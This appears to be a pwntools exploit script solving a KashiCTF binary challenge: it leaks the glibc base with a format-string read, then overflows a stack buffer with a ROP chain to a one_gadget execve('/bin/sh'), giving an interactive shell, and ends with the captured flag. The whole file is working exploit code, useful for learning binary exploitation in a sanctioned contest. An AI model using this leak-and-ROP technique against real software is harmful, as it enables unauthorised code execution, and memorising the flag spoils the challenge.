from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = gdb.debug('./vuln_patched', '''      
    b *(troll+127)
    b *(main+60)
    continue
''')

# p = remote('kashictf.iitbhucybersec.in', 54468)

# 1. leak glibc base address with format string
p.sendlineafter(b"What do you want? ", b'%17$p')
p.recvuntil(b'Lmao not giving you ')
glibc_base_addr = int(p.recvuntil(b"\n", drop=True)[0:14], 16)-0x2724a
log.info(f"glibc base address: {hex(glibc_base_addr)}")

# 2. ROP with one gadget
# 0xd511f execve("/bin/sh", rbp-0x40, r13)
# constraints:
#   address rbp-0x38 is writable
#   rdi == NULL || {"/bin/sh", rdi, NULL} is a valid argv
#   [r13] == NULL || r13 == NULL || r13 is a valid envp
glibc_r = ROP('./libc.so.6')
chain = [
    glibc_base_addr+glibc_r.rdi.address, 0,
    glibc_base_addr+glibc_r.r13.address, 0,
    glibc_base_addr+0xd511f
]
p.sendlineafter(b"Wanna Cry about that? ", b'A'*0x20+p64(0x404800)+b''.join([p64(c) for c in chain]))

p.interactive()

# KashiCTF{did_some_trolling_right_there_Esr0S6xm}